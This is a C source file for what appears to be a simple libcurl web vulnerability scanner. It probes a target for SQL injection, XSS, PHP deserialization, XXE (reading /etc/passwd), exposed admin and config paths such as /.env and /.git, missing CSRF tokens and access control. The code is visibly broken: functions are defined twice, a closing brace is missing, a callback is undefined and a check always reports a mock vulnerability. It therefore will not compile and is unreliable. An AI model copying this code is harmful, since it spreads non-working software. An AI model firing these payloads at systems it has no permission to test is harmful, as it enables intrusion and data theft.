#include <stdio.h>
#include <curl/curl.h>
#include <string.h>
#include <libxml/HTMLparser.h>
#include <libxml/xpath.h>
#include <jansson.h>
#include "request_handler.h"
// Include other necessary headers

#include "web.h"

size_t write_callback(char *data, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if(ptr == NULL) {
        // out of memory!
        printf("Not enough memory (realloc returned NULL)\n");
        return 0;
    }

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), data, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;  // Null-terminate it

    return realsize;
}

void web_scan(char *target) {
    printf("Scanning web server %s...\n", target);

    return size * nmemb;
}

void check_sql_injection(char *target) {
    CURL *curl;
    CURLcode res;
    char errorbuf[CURL_ERROR_SIZE];
    struct MemoryStruct chunk;

    chunk.memory = malloc(1);  // Will grow as needed by the realloc above
    chunk.size = 0;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, target);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-sql-scanner/1.0");
        curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errorbuf);

        char payload[] = "' OR '1'='1";
        char url_with_payload[1024];
        snprintf(url_with_payload, sizeof(url_with_payload), "%s%s", target, payload);
        curl_easy_setopt(curl, CURLOPT_URL, url_with_payload);

        printf("Sending request to: %s\n", url_with_payload);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            fprintf(stderr, "Detailed error: %s\n", errorbuf);
        } else {
            // Check the response chunk.memory for indications of a successful SQL injection.
            // For simplicity, we're just printing the response.
            printf("%lu bytes received:\n", (unsigned long)chunk.size);
            printf("%s", chunk.memory);
        }

        curl_easy_cleanup(curl);
        free(chunk.memory);
    }

    curl_global_cleanup();
}

void check_xss(char *target) {
    CURL *curl;
    CURLcode res;
    char errorbuf[CURL_ERROR_SIZE];
    struct MemoryStruct chunk;

    chunk.memory = malloc(1);
    chunk.size = 0;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-xss-scanner/1.0");
        curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errorbuf);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);  // Follow redirects

        // A basic XSS payload, that when executed by the browser, would display an alert box.
        char payload[] = "<script>alert('xss')</script>";
        char url_with_payload[1024];
        snprintf(url_with_payload, sizeof(url_with_payload), "%s%s", target, payload);
        curl_easy_setopt(curl, CURLOPT_URL, url_with_payload);

        printf("Sending request to: %s\n", url_with_payload);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            fprintf(stderr, "Detailed error: %s\n", errorbuf);
        } else {
            // Check the response chunk.memory for indications of the payload.
            if (strstr(chunk.memory, payload)) {
                printf("Potential XSS vulnerability detected!\n");
            } else {
                printf("No direct evidence of XSS found in response.\n");
            }
        }

        curl_easy_cleanup(curl);
        free(chunk.memory);
    }

    curl_global_cleanup();
}

void check_insecure_deserialization(char *target) {
    CURL *curl;
    CURLcode res;
    char errorbuf[CURL_ERROR_SIZE];
    struct MemoryStruct chunk;

    chunk.memory = malloc(1);
    chunk.size = 0;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-deserialization-scanner/1.0");
        curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errorbuf);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

        // An example payload for PHP's `unserialize` function.
        // This payload will attempt to delete a file named "testfile.txt" on the server.
        char payload[] = "O:8:\"stdClass\":1:{s:4:\"file\";s:11:\"testfile.txt\";}";
        char url_with_payload[1024];
        snprintf(url_with_payload, sizeof(url_with_payload), "%s?data=%s", target, payload);
        curl_easy_setopt(curl, CURLOPT_URL, url_with_payload);

        printf("Sending request to: %s\n", url_with_payload);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            fprintf(stderr, "Detailed error: %s\n", errorbuf);
        } else {
            if (strstr(chunk.memory, "Error deleting testfile.txt")) {
                printf("Potential insecure deserialization vulnerability detected!\n");
            } else {
                printf("No direct evidence of insecure deserialization found in response.\n");
            }
        }

        curl_easy_cleanup(curl);
        free(chunk.memory);
    }

    curl_global_cleanup();
}

void check_security_misconfig(char *target) {
    printf("Checking for security misconfiguration...\n");

    // A list of common admin interfaces and config files
    char *paths[] = {
        "/admin", 
        "/login", 
        "/wp-admin", 
        "/phpMyAdmin", 
        "/config.php",
        "/.env",
        "/.git", 
        NULL  // Marks the end of the array
    };

    CURL *curl;
    CURLcode res;
    char errorbuf[CURL_ERROR_SIZE];
    struct MemoryStruct chunk;

    chunk.memory = malloc(1);
    chunk.size = 0;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-misconfig-scanner/1.0");
        curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errorbuf);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1); // Use HEAD request to minimize impact

        for(int i = 0; paths[i] != NULL; i++) {
            char full_url[1024];
            snprintf(full_url, sizeof(full_url), "%s%s", target, paths[i]);
            curl_easy_setopt(curl, CURLOPT_URL, full_url);

            printf("Checking URL: %s\n", full_url);

            res = curl_easy_perform(curl);
            if(res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                fprintf(stderr, "Detailed error: %s\n", errorbuf);
            } else {
                long http_code = 0;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

                // If the HTTP response code is 200, it might indicate a potential misconfiguration.
                if (http_code == 200) {
                    printf("Potential security misconfiguration detected at: %s\n", full_url);
                }
            }
        }

        curl_easy_cleanup(curl);
        free(chunk.memory);
    }

    curl_global_cleanup();
}
void check_sensitive_data_exposure(char *target) {
    printf("Checking for sensitive data exposure...\n");

    // List of keywords that might indicate sensitive data
    char *keywords[] = {
        "password", 
        "creditcard", 
        "ssn", 
        "social security number", 
        "cvv", 
        "expiry date",
        "DOB",
        "PIN",
        NULL  // End marker
    };

    CURL *curl;
    CURLcode res;
    char errorbuf[CURL_ERROR_SIZE];
    struct MemoryStruct chunk;

    chunk.memory = malloc(1);
    chunk.size = 0;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-sensitive-data-scanner/1.0");
        curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errorbuf);
        curl_easy_setopt(curl, CURLOPT_URL, target);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            fprintf(stderr, "Detailed error: %s\n", errorbuf);
        } else {
            for(int i = 0; keywords[i] != NULL; i++) {
                if(strstr(chunk.memory, keywords[i]) != NULL) {
                    printf("Potential sensitive data exposure detected. Keyword found: %s\n", keywords[i]);
                }
            }
        }

        curl_easy_cleanup(curl);
        free(chunk.memory);
    }

    curl_global_cleanup();
}

void check_missing_func_level_access_control(char *target) {
    printf("Checking for missing function level access control...\n");
        char *endpoints[] = {
        "/admin/",
        "/api/user/delete",
        "/api/settings",
        "/secure/data",
        NULL  // End marker
    };

    CURL *curl;
    CURLcode res;
    char errorbuf[CURL_ERROR_SIZE];
    struct MemoryStruct chunk;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-access-control-scanner/1.0");
        curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errorbuf);

        for(int i = 0; endpoints[i] != NULL; i++) {
            char full_url[1024];
            snprintf(full_url, sizeof(full_url), "%s%s", target, endpoints[i]);

            curl_easy_setopt(curl, CURLOPT_URL, full_url);

            res = curl_easy_perform(curl);
            if(res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed on %s: %s\n", full_url, curl_easy_strerror(res));
                fprintf(stderr, "Detailed error: %s\n", errorbuf);
            } else {
                long response_code;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
                if(response_code == 200) {
                    printf("Potential missing access control at endpoint: %s\n", endpoints[i]);
                }
            }
            free(chunk.memory);
            chunk.memory = malloc(1);
            chunk.size = 0;
        }

        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
}

void check_csrf(char *target) {
    printf("Checking for CSRF...\n");

    CURL *curl;
    CURLcode res;
    char errorbuf[CURL_ERROR_SIZE];
    struct MemoryStruct chunk;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-csrf-scanner/1.0");
        curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errorbuf);
        curl_easy_setopt(curl, CURLOPT_URL, target);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            fprintf(stderr, "Detailed error: %s\n", errorbuf);
        } else {
            // Parse the HTML content
            htmlDocPtr doc = htmlReadMemory(chunk.memory, chunk.size, target, NULL, 0);
            if (doc == NULL) {
                fprintf(stderr, "Error parsing the HTML\n");
                return;
            }

            xmlXPathContextPtr xpathCtx = xmlXPathNewContext(doc);
            if (xpathCtx == NULL) {
                fprintf(stderr, "Error creating XPath context\n");
                xmlFreeDoc(doc);
                return;
            }

            // Find all forms in the HTML content
            xmlXPathObjectPtr xpathObj = xmlXPathEvalExpression((xmlChar*)"//form", xpathCtx);
            if (!xpathObj) {
                fprintf(stderr, "Error evaluating XPath\n");
                xmlXPathFreeContext(xpathCtx);
                xmlFreeDoc(doc);
                return;
            }

            xmlNodeSetPtr nodes = xpathObj->nodesetval;
            for (int i = 0; i < (nodes ? nodes->nodeNr : 0); i++) {
                // Check if the form has a CSRF token field
                xmlNodePtr csrfNode = xmlXPathNodeEval(nodes->nodeTab[i], (xmlChar*)".//input[@name='csrf_token']", xpathCtx);
                if (!csrfNode) {
                    printf("Potential CSRF vulnerability found in a form action: %s\n", 
                            xmlGetProp(nodes->nodeTab[i], (xmlChar*)"action"));
                }
                xmlFreeNodeList(csrfNode);
            }

            xmlXPathFreeObject(xpathObj);
            xmlXPathFreeContext(xpathCtx);
            xmlFreeDoc(doc);
        }

        // Clear the chunk's memory
        free(chunk.memory);
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
}

void check_using_comp_with_known_vuln(char *target) {
    printf("Checking for use of components with known vulnerabilities...\n");

    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;

    chunk.memory = malloc(1);  // Will grow as needed by the reallocs
    chunk.size = 0;            // No data at this point

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if(curl) {
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_URL, target);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        } else {
            // Parse the JSON content
            json_error_t error;
            json_t *root = json_loads(chunk.memory, 0, &error);

            if(!root) {
                fprintf(stderr, "Error parsing JSON: %s\n", error.text);
                return;
            }

            json_t *components = json_object_get(root, "components");  // Assuming the JSON has a "components" key
            if(!json_is_array(components)) {
                fprintf(stderr, "components is not an array\n");
                json_decref(root);
                return;
            }

            size_t index;
            json_t *value;

            // Iterate over each component
            json_array_foreach(components, index, value) {
                const char *component_name = json_string_value(json_object_get(value, "name"));
                const char *component_version = json_string_value(json_object_get(value, "version"));
                // 2. For each component, check against a vulnerability database
                printf("Checking component: %s, version: %s...\n", component_name, component_version);
                // If vulnerabilities found for this mock, print them out
                printf("Mock vulnerability found for component: %s, version: %s\n", component_name, component_version);
            }

            json_decref(root);
        }

        curl_easy_cleanup(curl);
    }

    free(chunk.memory);
    curl_global_cleanup();
}
void check_insufficient_logging_monitoring(char *target) {
    printf("Checking for insufficient logging and monitoring...\n");
    char *response = make_request(target, "non_existent_page");
    if (strstr(response, "stack trace") || strstr(response, "debug mode")) {
        printf("Potential issue found: Server might be revealing debug information.\n");
    }


size_t write_callback(char *buffer, size_t size, size_t nitems, void *userdata) {
    strcat((char *)userdata, buffer);
    return size * nitems;
}

void check_xml_external_entities(char *target) {
    printf("Checking for XML external entities (XXE)...\n");

    CURL *curl;
    CURLcode res;
    char payload[] = 
        "<?xml version=\"1.0\"?>"
        "<!DOCTYPE foo ["
        "<!ELEMENT foo ANY >"
        "<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]> "
        "<foo>&xxe;</foo>";

    char response[4096] = {0};

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, target);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "CURL request failed: %s\n", curl_easy_strerror(res));
        } else {
            if(strstr(response, "root:x:0:0:")) { 
                printf("Potential XXE vulnerability detected! Response contains content from /etc/passwd.\n");
            }
        }

        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

void web_scan(char *target) {
    printf("Scanning web server %s...\n", target);

    check_sql_injection(target);
    check_xss(target);
    check_insecure_deserialization(target);
    check_security_misconfig(target);
    check_sensitive_data_exposure(target);
    check_missing_func_level_access_control(target);
    check_csrf(target);
    check_using_comp_with_known_vuln(target);
    check_insufficient_logging_monitoring(target);
    check_xml_external_entities(target);
}
